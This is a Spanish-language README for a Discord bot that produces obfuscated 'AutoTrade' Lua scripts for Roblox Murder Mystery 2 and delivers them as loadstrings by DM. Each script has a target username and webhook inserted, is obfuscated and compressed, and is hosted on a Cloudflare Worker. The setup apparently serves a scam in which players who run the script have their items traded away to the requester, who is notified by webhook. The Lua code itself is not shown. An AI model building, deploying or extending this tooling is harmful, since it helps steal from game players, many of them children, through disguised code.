# 🔪 MM2 AutoTrade Bot

Discord bot automatizado para generar y distribuir scripts de AutoTrade personalizados para Murder Mystery 2 en Roblox. El bot ofusca, comprime y almacena los scripts de forma segura usando Cloudflare.

## ✨ Características

- ✅ **Comandos slash** - Interfaz amigable con `/generate script`
- ✅ **Ofuscación** - Protege tu código con `javascript-obfuscator`
- ✅ **Compresión** - Reduce tamaño con zlib
- ✅ **Almacenamiento seguro** - Cloudflare KV con expiración de 30 días
- ✅ **Distribución automática** - Envía loadstring por DM
- ✅ **Validaciones** - Webhooks y usernames validados
- ✅ **Notificaciones** - Webhooks Discord para monitoreo
- ✅ **Manejo de errores** - Logs detallados y mensajes claros

## 📋 Requisitos

- **Node.js** v18 o superior
- **Cuenta de Discord** con permisos de bot
- **Cloudflare** (cuenta gratuita funciona)
- **Hosting** (Railway, Replit, VPS o tu PC)

## 🚀 Instalación Rápida

### 1️⃣ Clonar el Proyecto
```bash
git clone https://github.com/tu-usuario/mm2-autotrade-bot.git
cd mm2-autotrade-bot
```

### 2️⃣ Instalar Dependencias
```bash
npm install
```

### 3️⃣ Configurar Variables de Entorno
```bash
cp .env.example .env
# Edita .env y agrega tu DISCORD_TOKEN y CLOUDFLARE_WORKER_URL
```

### 4️⃣ Ejecutar el Bot
```bash
npm start
```

---

## 🔧 Setup Detallado

### Paso 1: Crear Aplicación en Discord

1. Ve a [Discord Developers](https://discord.com/developers/applications)
2. Haz clic en **"New Application"**
3. Dale un nombre (ej: `MM2 AutoTrade`)
4. Ve a **Bot** → **Add Bot**
5. Copia el **TOKEN** bajo el nombre del bot
6. Pega el token en tu `.env` como `DISCORD_TOKEN`

#### Habilitar Intents:
1. En la sección **Bot**, desplázate a **Privileged Gateway Intents**
2. Activa:
   - ✅ **Message Content Intent**
   - ✅ **Server Members Intent** (opcional)

#### Permisos OAuth2:
1. Ve a **OAuth2** → **URL Generator**
2. Selecciona scopes:
   - `bot`
3. Permisos:
   - ✅ Send Messages
   - ✅ Use Slash Commands
   - ✅ Send DMs to Users
4. Copia la URL generada y abre en tu navegador para invitar el bot a tu servidor

### Paso 2: Configurar Cloudflare Worker

#### 2.1 Crear el Worker
1. Ve a [Cloudflare Dashboard](https://dash.cloudflare.com)
2. En el sidebar, selecciona tu dominio (o crea uno gratis)
3. Ve a **Workers & Pages** → **Create Application**
4. Elige **Create Worker**
5. Nombre: `mm2-script-decoder`
6. Haz clic en **Deploy**

#### 2.2 Editar el Worker
1. En el editor, reemplaza todo el código con el contenido de `cloudflare-worker.js`
2. Haz clic en **Save and Deploy**

#### 2.3 Configurar KV Storage
1. En el dashboard de Cloudflare, ve a **KV**
2. Haz clic en **Create a namespace**
3. Nombre: `SCRIPTS`

#### 2.4 Vincular KV al Worker
1. Ve al editor de tu Worker
2. En la sección derecha, busca **Environment Variables**
3. Agrega una variable:
   - Nombre: `SCRIPTS`
   - Type: `KV Namespace`
   - Namespace: `SCRIPTS`
4. Guarda

#### 2.5 Agregar Pako (para descompresión)
1. En el editor del Worker, ve a la línea superior
2. Agrega:
   ```javascript
   import pako from 'https://cdn.jsdelivr.net/npm/pako@2/dist/pako.es5.min.js';
   ```
3. Guarda y despliega

#### 2.6 Obtener la URL
Tu Worker estará en: `https://mm2-script-decoder.TU-DOMINIO.workers.dev`

Cópialo en tu `.env` como `CLOUDFLARE_WORKER_URL`

### Paso 3: Personalizar el Script Lua

Edita `mm2-script.lua` con tu lógica de trading. El bot automáticamente:
- Reemplaza `TARGET_USER = "example"` con el username del usuario
- Reemplaza `WEBHOOK_URL = "example"` con el webhook del usuario
- Ofusca y comprime el código
- Lo sube a Cloudflare

---

## 🌐 Deploy en Producción

### Opción A: Railway (Recomendado)

1. Ve a [Railway.app](https://railway.app)
2. Crea una nueva cuenta con GitHub
3. Haz clic en **+ New Project**
4. Selecciona **Deploy from GitHub repo**
5. Conecta tu repositorio
6. En **Variables**, agrega:
   - `DISCORD_TOKEN`
   - `CLOUDFLARE_WORKER_URL`
7. Deploy automático ✅

### Opción B: Replit

1. Ve a [Replit.com](https://replit.com)
2. Crea una cuenta
3. Haz clic en **+ Create**
4. Selecciona **Import from GitHub**
5. Pega tu URL del repo
6. En **Secrets**, agrega las variables
7. Abre la consola y ejecuta: `npm start`

### Opción C: VPS (Linux)

```bash
# Instalar Node.js
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y nodejs

# Clonar y configurar
git clone TU-REPO
cd mm2-autotrade-bot
npm install
cp .env.example .env
# Edita .env con tus credenciales

# Ejecutar con PM2
npm install -g pm2
pm2 start bot.js --name "mm2-bot"
pm2 save
pm2 startup
```

---

## 📡 Endpoints del API

### POST `/store`
Almacena un script comprimido
```json
{
  "script": "base64_encoded_compressed"
}
```
**Respuesta:**
```json
{
  "success": true,
  "id": "abc123def456",
  "url": "https://..../decode?id=abc123def456",
  "expires_in": "30 days"
}
```

### GET `/decode?id=xxx`
Descarga y descomprime el script
- **Respuesta:** Código Lua descomprimido

### GET `/stats?id=xxx`
Obtiene información del script
```json
{
  "id": "abc123",
  "size": 5000,
  "compressed_size": 3500,
  "created_at": "2024-01-15T10:30:00Z",
  "expires_in": "30 days"
}
```

### DELETE `/cleanup?id=xxx`
Elimina un script (antes de los 30 días)

### GET `/`
Health check del servicio

---

## 🐛 Troubleshooting

### ❌ Bot no responde al comando
- Verifica que el bot tiene permisos en el servidor
- Asegúrate de tener el `DISCORD_TOKEN` correcto
- Reinicia el bot: `npm start`

### ❌ Error al enviar DM
- El usuario debe tener DMs abiertos de bots
- El bot necesita permiso "Send DMs to Users"

### ❌ Cloudflare devuelve 404
- Verifica que el `id` existe en KV
- Comprueba que el namespace `SCRIPTS` está vinculado
- Revisa el worker está deployado correctamente

### ❌ Error de descompresión
- Asegúrate de tener pako importado en el Worker
- Verifica que el script se comprimió correctamente
- Revisa los logs de Cloudflare

### ❌ Script no se ejecuta
- Valida la sintaxis Lua del script
- Verifica el webhook URL sea válido
- Revisa los logs del bot: `npm run dev`

---

## 📝 Estructura del Proyecto

```
mm2-autotrade-bot/
├── bot.js                  # Bot principal de Discord
├── cloudflare-worker.js    # Worker de Cloudflare
├── mm2-script.lua          # Template del script
├── package.json            # Dependencias
├── .env.example            # Variables de ejemplo
├── README.md               # Este archivo
└── .gitignore              # Archivos a ignorar
```

---

## 🔐 Seguridad

- ⚠️ **Nunca** commitees tu `.env` (está en `.gitignore`)
- ⚠️ **Nunca** compartas tu `DISCORD_TOKEN`
- ✅ Los scripts se borran automáticamente en 30 días
- ✅ Cada script genera un ID único
- ✅ El código está ofuscado antes de enviarse

---

## 📚 Personalización

### Agregar más juegos
En `bot.js`, agrega más opciones al select menu:
```javascript
new StringSelectMenuOptionBuilder()
  .setLabel('Otro Juego')
  .setValue('otro_juego')
  .setEmoji('🎮')
```

Luego en la función `generateScript()`:
```javascript
if (game === 'otro_juego') {
  return OTRO_SCRIPT
    .replace(/TARGET_USER = "example"/g, `TARGET_USER = "${username}"`)
    .replace(/WEBHOOK_URL = "example"/g, `WEBHOOK_URL = "${webhook}"`);
}
```

### Cambiar tiempo de expiración
En `cloudflare-worker.js`, línea 107:
```javascript
expirationTtl: 60 * 24 * 60 * 60 // 60 días
```

### Modificar el template Lua
Edita `mm2-script.lua` y agrega tu lógica de trading. Solo las líneas de configuración se reemplazarán automáticamente.

---

## 📞 Soporte

Si encuentras problemas:
1. Revisa los logs: `npm run dev`
2. Verifica tu `.env` tenga valores correctos
3. Asegúrate que Cloudflare está deployado
4. Revisa que Discord tiene permisos correctos

---

## 📄 Licencia

MIT - Úsalo libremente

---

**Hecho con ❤️ para la comunidad de Roblox MM2**
